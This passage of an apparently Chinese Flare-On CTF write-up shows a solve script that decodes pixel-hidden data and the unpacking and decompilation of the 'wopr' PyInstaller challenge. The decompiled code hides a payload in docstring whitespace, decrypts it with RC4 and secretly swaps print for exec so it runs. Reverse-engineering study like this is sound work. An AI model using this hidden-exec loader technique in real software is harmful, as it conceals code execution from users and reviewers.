class="title">extractFile</span>():</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    img = Image.open(<span class="string">&#x27;flag.bmp&#x27;</span>)</span><br><span class="line">    <span class="comment"># img2 = Image.open(&#x27;new1.jpg&#x27;)</span></span><br><span class="line">    pixel = img.load()</span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">            p = pixel[x, y]</span><br><span class="line">            <span class="comment"># print(p)</span></span><br><span class="line">            data = (p[<span class="number">0</span>]&amp;<span class="number">7</span>) | ((p[<span class="number">1</span>]&amp;<span class="number">7</span>)&lt;&lt;<span class="number">3</span>) | ((p[<span class="number">2</span>]&amp;<span class="number">3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">            d.append(data)</span><br><span class="line"></span><br><span class="line">    extract_file = <span class="string">&quot;&quot;</span>.join(map(chr,d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(extract_file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">idx</span>):</span></span><br><span class="line">    b = ((<span class="number">0xc5</span>*(idx+<span class="number">1</span>))^ (<span class="number">0x7d</span>*(idx+<span class="number">2</span>)))&amp;<span class="number">0xff</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">byte,len</span>):</span> <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len):</span><br><span class="line">        b2 = ((byte &amp; <span class="number">128</span>) / <span class="number">128</span>) &amp;<span class="number">0xff</span></span><br><span class="line">        b = ((byte * <span class="number">2</span> &amp; <span class="number">0xff</span>) + b2) &amp; <span class="number">0xff</span>    </span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span>(<span class="params">byte,len</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len):</span><br><span class="line">        b2 = ((byte &amp; <span class="number">1</span>) * <span class="number">128</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        b = ((byte / <span class="number">2</span> &amp; <span class="number">0xff</span>) + b2) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">return</span> a^b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> (a&gt;&gt;i&amp;<span class="number">1</span>) == (b&gt;&gt;i&amp;<span class="number">1</span>):</span><br><span class="line">a = a &amp; ~(<span class="number">1</span>&lt;&lt;i)&amp;<span class="number">255</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = a | (<span class="number">1</span>&lt;&lt;i)&amp;<span class="number">255</span></span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># def f(idx):</span></span><br><span class="line"><span class="comment"># n = 1</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment"># yield ((n*309030853)^((n+1)*209897853))&amp;0xff</span></span><br><span class="line"><span class="comment"># n += 1</span></span><br><span class="line"><span class="comment"># b = ((idx+1)*309030853)&amp;0xff</span></span><br><span class="line"><span class="comment"># k = ((idx+2)*209897853)&amp;0xff</span></span><br><span class="line"><span class="comment"># return b ^ k</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_left</span> (<span class="params">int_value,k,bit = <span class="number">8</span></span>):</span> </span><br><span class="line">    bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit</span><br><span class="line">    bin_value = bit_string.format(int_value) <span class="comment"># 8 bit binary</span></span><br><span class="line">    bin_value = bin_value[k:] + bin_value[:k]</span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># right circular shift</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_right</span> (<span class="params">int_value,k,bit = <span class="number">8</span></span>):</span> </span><br><span class="line">    bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit </span><br><span class="line">    bin_value = bit_string.format(int_value) <span class="comment"># 8 bit binary </span></span><br><span class="line">    bin_value = bin_value[-k:] + bin_value[:-k] </span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="comment"># c((a((data[i] ^ f(num++)) , 7))) ^ f(num++),3)</span></span><br><span class="line"><span class="comment"># f =&gt; g  a =&gt; b  c =&gt; d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    data = open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="comment"># data = data[::-1]</span></span><br><span class="line"></span><br><span class="line">    data2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data3 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data4 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data5 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(data)):</span><br><span class="line">        data2 += chr(circular_shift_left(ord(data[i]),<span class="number">3</span>))</span><br><span class="line">        data3 += chr(ord(data2[i]) ^ g(<span class="number">2</span>*i+<span class="number">1</span>) ) </span><br><span class="line">        data4 += chr(circular_shift_right(ord(data3[i]),<span class="number">7</span>))</span><br><span class="line">        data5 += chr(ord(data4[i]) ^ g(<span class="number">2</span>*i))</span><br><span class="line"></span><br><span class="line">    save = open(<span class="string">&quot;flag.bmp&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    save.write(data5)</span><br><span class="line"></span><br><span class="line">decode()</span><br></pre></td></tr></table></figure><h2 id="7-wopr"><a href="#7-wopr" class="headerlink" title="7 - wopr"></a>7 - wopr</h2><p>一个 PE 文件，IDA打开分析发现是 pyintaller 打包的，使用 <a href="https://github.com/countercept/python-exe-unpacker">pyinstxtractor</a> 进行解包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py wopr.exe</span><br></pre></td></tr></table></figure><p>得到一堆解包后的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># swing @ localhost in ~&#x2F;Desktop&#x2F;flare-on&#x2F;7 - wopr&#x2F;wopr.exe_extracted [14:15:19]</span><br><span class="line">$ ls</span><br><span class="line">PYZ-00.pyz                                      api-ms-win-crt-convert-l1-1-0.dll</span><br><span class="line">PYZ-00.pyz_extracted                            api-ms-win-crt-environment-l1-1-0.dll</span><br><span class="line">VCRUNTIME140.dll                                api-ms-win-crt-filesystem-l1-1-0.dll</span><br><span class="line">_bz2.pyd                                        api-ms-win-crt-heap-l1-1-0.dll</span><br><span class="line">_ctypes.pyd                                     api-ms-win-crt-locale-l1-1-0.dll</span><br><span class="line">_hashlib.pyd                                    api-ms-win-crt-math-l1-1-0.dll</span><br><span class="line">_lzma.pyd                                       api-ms-win-crt-process-l1-1-0.dll</span><br><span class="line">_socket.pyd                                     api-ms-win-crt-runtime-l1-1-0.dll</span><br><span class="line">_ssl.pyd                                        api-ms-win-crt-stdio-l1-1-0.dll</span><br><span class="line">api-ms-win-core-console-l1-1-0.dll              api-ms-win-crt-string-l1-1-0.dll</span><br><span class="line">api-ms-win-core-datetime-l1-1-0.dll             api-ms-win-crt-time-l1-1-0.dll</span><br><span class="line">api-ms-win-core-debug-l1-1-0.dll                api-ms-win-crt-utility-l1-1-0.dll</span><br><span class="line">api-ms-win-core-errorhandling-l1-1-0.dll        base_library</span><br><span class="line">api-ms-win-core-file-l1-1-0.dll                 base_library.zip</span><br><span class="line">api-ms-win-core-file-l1-2-0.dll                 libcrypto-1_1.dll</span><br><span class="line">api-ms-win-core-file-l2-1-0.dll                 libssl-1_1.dll</span><br><span class="line">api-ms-win-core-handle-l1-1-0.dll               pyexpat.pyd</span><br><span class="line">api-ms-win-core-heap-l1-1-0.dll                 pyi-windows-manifest-filename wopr.exe.manifest</span><br><span class="line">api-ms-win-core-interlocked-l1-1-0.dll          pyiboot01_bootstrap</span><br><span class="line">api-ms-win-core-libraryloader-l1-1-0.dll        pyiboot01_bootstrap_dis</span><br><span class="line">api-ms-win-core-localization-l1-2-0.dll         pyiboot02_cleanup.py</span><br><span class="line">api-ms-win-core-memory-l1-1-0.dll               pyiboot02_cleanup.pyc</span><br><span class="line">api-ms-win-core-namedpipe-l1-1-0.dll            pyiboot02_cleanup_dis</span><br><span class="line">api-ms-win-core-processenvironment-l1-1-0.dll   pyimod01_os_path</span><br><span class="line">api-ms-win-core-processthreads-l1-1-0.dll       pyimod02_archive</span><br><span class="line">api-ms-win-core-processthreads-l1-1-1.dll       pyimod03_importers</span><br><span class="line">api-ms-win-core-profile-l1-1-0.dll              python37.dll</span><br><span class="line">api-ms-win-core-rtlsupport-l1-1-0.dll           select.pyd</span><br><span class="line">api-ms-win-core-string-l1-1-0.dll               struct</span><br><span class="line">api-ms-win-core-synch-l1-1-0.dll                this key</span><br><span class="line">api-ms-win-core-synch-l1-2-0.dll                this\__init__.py</span><br><span class="line">api-ms-win-core-sysinfo-l1-1-0.dll              this\key</span><br><span class="line">api-ms-win-core-timezone-l1-1-0.dll             ucrtbase.dll</span><br><span class="line">api-ms-win-core-util-l1-1-0.dll                 unicodedata.pyd</span><br><span class="line">api-ms-win-crt-conio-l1-1-0.dll                 wopr.exe.manifest</span><br></pre></td></tr></table></figure><p>由于题目提示是要找启动代码，所以找到了pyi** 开头的几个文件 由于几个文件缺少了pyc头，我们将pyc头给补上（python3.7版本）然后使用 <strong>python-uncompyle6</strong> 进行反编译，其中 pyiboot-2_cleanup代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, io, lzma, pkgutil, random, struct, sys, time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">print(<span class="string">&#x27;LOADING...&#x27;</span>)</span><br><span class="line">BOUNCE = pkgutil.get_data(<span class="string">&#x27;this&#x27;</span>, <span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ho</span>(<span class="params">h, g=&#123;&#125;</span>):</span></span><br><span class="line">    k = bytes.fromhex(format(h, <span class="string">&#x27;x&#x27;</span>)).decode()</span><br><span class="line">    <span class="keyword">return</span> g.get(k, k)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">1702389091</span></span><br><span class="line">b = <span class="number">482955849332</span></span><br><span class="line">g = ho(<span class="number">29516388843672123817340395359</span>, globals())</span><br><span class="line">aa = getattr(g, ho(a))</span><br><span class="line">bb = getattr(g, ho(b))</span><br><span class="line">a ^= b</span><br><span class="line">b ^= a</span><br><span class="line">a ^= b</span><br><span class="line">setattr(g, ho(a), aa)</span><br><span class="line">setattr(g, ho(b), bb)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eye</span>(<span class="params">face</span>):</span></span><br><span class="line">    leg = io.BytesIO()</span><br><span class="line">    <span class="keyword">for</span> arm <span class="keyword">in</span> face.splitlines():</span><br><span class="line">        print(arm)</span><br><span class="line">        arm = arm[len(arm.rstrip(<span class="string">&#x27; \t&#x27;</span>)):]</span><br><span class="line">        leg.write(arm)</span><br><span class="line"></span><br><span class="line">    face = leg.getvalue()</span><br><span class="line">    bell = io.BytesIO()</span><br><span class="line">    x, y = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> chuck <span class="keyword">in</span> face:</span><br><span class="line">        taxi = &#123;<span class="number">9</span>:<span class="number">0</span>, </span><br><span class="line">         <span class="number">32</span>:<span class="number">1</span>&#125;.get(chuck)</span><br><span class="line">        <span class="keyword">if</span> taxi <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        x, y = x | taxi &lt;&lt; y, y + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">7</span>:</span><br><span class="line">            bell.write(bytes([x]))</span><br><span class="line">            x, y = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> bell.getvalue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fire</span>(<span class="params">wood, bounce</span>):</span></span><br><span class="line">    meaning = bytearray(wood)</span><br><span class="line">    bounce = bytearray(bounce)</span><br><span class="line">    regard = len(bounce)</span><br><span class="line">    manage = list(range(<span class="number">256</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prospect</span>(<span class="params">*financial</span>):</span></span><br><span class="line">        <span class="keyword">return</span> sum(financial) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blade</span>(<span class="params">feel, cassette</span>):</span></span><br><span class="line">        cassette = prospect(cassette, manage[feel])</span><br><span class="line">        manage[feel], manage[cassette] = manage[cassette], manage[feel]</span><br><span class="line">        <span class="keyword">return</span> cassette</span><br><span class="line"></span><br><span class="line">    cassette = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> feel <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        cassette = prospect(cassette, bounce[(feel % regard)])</span><br><span class="line">        cassette = blade(feel, cassette)</span><br><span class="line"></span><br><span class="line">    cassette = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pigeon, _ <span class="keyword">in</span> enumerate(meaning):</span><br><span class="line">        feel = prospect(pigeon, <span class="number">1</span>)</span><br><span class="line">        cassette = blade(feel, cassette)</span><br><span class="line">        meaning[pigeon] ^= manage[prospect(manage[feel], manage[cassette])]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes(meaning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(lzma.decompress(fire(eye(__doc__.encode()), bytes([i]) + BOUNCE)))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>他会取<code>__doc__</code> 里的制表符和空格进行编码，然后rc4解密，然后解压缩，但是 python-uncompyle6 这个反编译后的代码没有了 制表符，后面我又搜了个工具叫 pycdc 重新反编译，得到了一部分新代码。</p><p>但是后面发现没有输出，最后发现前面有一段代码将print 替换成了exec</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">GREETINGS = [<span class="string">&quot;HI&quot;</span>, <span class="string">&quot;HELLO&quot;</span>, <span class="string">&quot;&#x27;SUP&quot;</span>, <span class="string">&quot;AHOY&quot;</span>, <span class="string">&quot;ALOHA&quot;</span>, <span class="string">&quot;HOWDY&quot;</span>, <span class="string">&quot;GREETINGS&quot;</span>, <span class="string">&quot;ZDRAVSTVUYTE&quot;</span>]</span><br><span class="line">STRATEGIES = [<span class="string">&#x27;U.S. FIRST STRIKE&#x27;</span>, <span class="string">&#x27;USSR FIRST STRIKE&#x27;</span>, <span class="string">&#x27;NATO / WARSAW PACT&#x27;</span>, <span class="string">&#x27;FAR EAST STRATEGY&#x27;</span>, <span class="string">&#x27;US USSR ESCALATION&#x27;</span>, <span class="string">&#x27;MIDDLE EAST WAR&#x27;</span>, <span class="string">&#x27;USSR CHINA ATTACK&#x27;</span>, <span class="string">&#x27;INDIA PAKISTAN WAR&#x27;</span>, <span class="string">&#x27;MEDITERRANEAN WAR&#x27;</span>, <span class="string">&#x27;HONGKONG VARIANT&#x27;</span>, <span class="string">&#x27;SEATO DECAPITATING&#x27;</span>, <span class="string">&#x27;CUBAN PROVOCATION&#x27;</span>, <span class="string">&#x27;ATLANTIC HEAVY&#x27;</span>, <span class="string">&#x27;CUBAN PARAMILITARY&#x27;</span>, <span class="string">&#x27;NICARAGUAN PREEMPTIVE&#x27;</span>, <span class="string">&#x27;PACIFIC TERRITORIAL&#x27;</span>, <span class="string">&#x27;BURMESE THEATERWIDE&#x27;</span>, <span class="string">&#x27;TURKISH DECOY&#x27;</span>, <span class="string">&#x27;ARGENTINA ESCALATION&#x27;</span>, <span class="string">&#x27;ICELAND MAXIMUM&#x27;</span>, <span class="string">&#x27;ARABIAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;U.S. SUBVERSION&#x27;</span>, <span class="string">&#x27;AUSTRALIAN MANEUVER&#x27;</span>, <span class="string">&#x27;SUDAN SURPRISE&#x27;</span>, <span class="string">&#x27;NATO TERRITORIAL&#x27;</span>, <span class="string">&#x27;ZAIRE ALLIANCE&#x27;</span>, <span class="string">&#x27;ICELAND INCIDENT&#x27;</span>, <span class="string">&#x27;ENGLISH ESCALATION&#x27;</span>, <span class="string">&#x27;MIDDLE EAST HEAVY&#x27;</span>, <span class="string">&#x27;MEXICAN TAKEOVER&#x27;</span>, <span class="string">&#x27;CHAD ALERT&#x27;</span>, <span class="string">&#x27;SAUDI MANEUVER&#x27;</span>, <span class="string">&#x27;AFRICAN TERRITORIAL&#x27;</span>, <span class="string">&#x27;ETHIOPIAN ESCALATION&#x27;</span>, <span class="string">&#x27;TURKISH HEAVY&#x27;</span>, <span class="string">&#x27;NATO INCURSION&#x27;</span>, <span class="string">&#x27;U.S. DEFENSE&#x27;</span>, <span class="string">&#x27;CAMBODIAN HEAVY&#x27;</span>, <span class="string">&#x27;PACT MEDIUM&#x27;</span>, <span class="string">&#x27;ARCTIC MINIMAL&#x27;</span>, <span class="string">&#x27;MEXICAN DOMESTIC&#x27;</span>, <span class="string">&#x27;TAIWAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;PACIFIC MANEUVER&#x27;</span>, <span class="string">&#x27;PORTUGAL REVOLUTION&#x27;</span>, <span class="string">&#x27;ALBANIAN DECOY&#x27;</span>, <span class="string">&#x27;PALESTINIAN LOCAL&#x27;</span>, <span class="string">&#x27;MOROCCAN MINIMAL&#x27;</span>, <span class="string">&#x27;BAVARIAN DIVERSITY&#x27;</span>, <span class="string">&#x27;CZECH OPTION&#x27;</span>, <span class="string">&#x27;FRENCH ALLIANCE&#x27;</span>, <span class="string">&#x27;ARABIAN CLANDESTINE&#x27;</span>, <span class="string">&#x27;GABON REBELLION&#x27;</span>, <span class="string">&#x27;NORTHERN MAXIMUM&#x27;</span>, <span class="string">&#x27;DANISH PARAMILITARY&#x27;</span>, <span class="string">&#x27;SEATO TAKEOVER&#x27;</span>, <span class="string">&#x27;HAWAIIAN ESCALATION&#x27;</span>, <span class="string">&#x27;IRANIAN MANEUVER&#x27;</span>, <span class="string">&#x27;NATO CONTAINMENT&#x27;</span>, <span class="string">&#x27;SWISS INCIDENT&#x27;</span>, <span class="string">&#x27;CUBAN MINIMAL&#x27;</span>, <span class="string">&#x27;CHAD ALERT&#x27;</span>, <span class="string">&#x27;ICELAND ESCALATION&#x27;</span>, <span class="string">&#x27;VIETNAMESE RETALIATION&#x27;</span>, <span class="string">&#x27;SYRIAN PROVOCATION&#x27;</span>, <span class="string">&#x27;LIBYAN LOCAL&#x27;</span>, <span class="string">&#x27;GABON TAKEOVER&#x27;</span>, <span class="string">&#x27;ROMANIAN WAR&#x27;</span>, <span class="string">&#x27;MIDDLE EAST OFFENSIVE&#x27;</span>, <span class="string">&#x27;DENMARK MASSIVE&#x27;</span>, <span class="string">&#x27;CHILE CONFRONTATION&#x27;</span>, <span class="string">&#x27;S.AFRICAN SUBVERSION&#x27;</span>, <span class="string">&#x27;USSR ALERT&#x27;</span>, <span class="string">&#x27;NICARAGUAN THRUST&#x27;</span>, <span class="string">&#x27;GREENLAND DOMESTIC&#x27;</span>, <span class="string">&#x27;ICELAND HEAVY&#x27;</span>, <span class="string">&#x27;KENYA OPTION&#x27;</span>, <span class="string">&#x27;PACIFIC DEFENSE&#x27;</span>, <span class="string">&#x27;UGANDA MAXIMUM&#x27;</span>, <span class="string">&#x27;THAI SUBVERSION&#x27;</span>, <span class="string">&#x27;ROMANIAN STRIKE&#x27;</span>, <span class="string">&#x27;PAKISTAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;AFGHAN MISDIRECTION&#x27;</span>, <span class="string">&#x27;ETHIOPIAN LOCAL&#x27;</span>, <span class="string">&#x27;ITALIAN TAKEOVER&#x27;</span>, <span class="string">&#x27;VIETNAMESE INCIDENT&#x27;</span>, <span class="string">&#x27;ENGLISH PREEMPTIVE&#x27;</span>, <span class="string">&#x27;DENMARK ALTERNATE&#x27;</span>, <span class="string">&#x27;THAI CONFRONTATION&#x27;</span>, <span class="string">&#x27;TAIWAN SURPRISE&#x27;</span>, <span class="string">&#x27;BRAZILIAN STRIKE&#x27;</span>, <span class="string">&#x27;VENEZUELA SUDDEN&#x27;</span>, <span class="string">&#x27;MALAYSIAN ALERT&#x27;</span>, <span class="string">&#x27;ISREAL DISCRETIONARY&#x27;</span>, <span class="string">&#x27;LIBYAN ACTION&#x27;</span>, <span class="string">&#x27;PALESTINIAN TACTICAL&#x27;</span>, <span class="string">&#x27;NATO ALTERNATE&#x27;</span>, <span class="string">&#x27;CYPRESS MANEUVER&#x27;</span>, <span class="string">&#x27;EGYPT MISDIRECTION&#x27;</span>, <span class="string">&#x27;BANGLADESH THRUST&#x27;</span>, <span class="string">&#x27;KENYA DEFENSE&#x27;</span>, <span class="string">&#x27;BANGLADESH CONTAINMENT&#x27;</span>, <span class="string">&#x27;VIETNAMESE STRIKE&#x27;</span>, <span class="string">&#x27;ALBANIAN CONTAINMENT&#x27;</span>, <span class="string">&#x27;GABON SURPRISE&#x27;</span>, <span class="string">&#x27;IRAQ SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;VIETNAMESE SUDDEN&#x27;</span>, <span class="string">&#x27;LEBANON INTERDICTION&#x27;</span>, <span class="string">&#x27;TAIWAN DOMESTIC&#x27;</span>, <span class="string">&#x27;ALGERIAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;ARABIAN STRIKE&#x27;</span>, <span 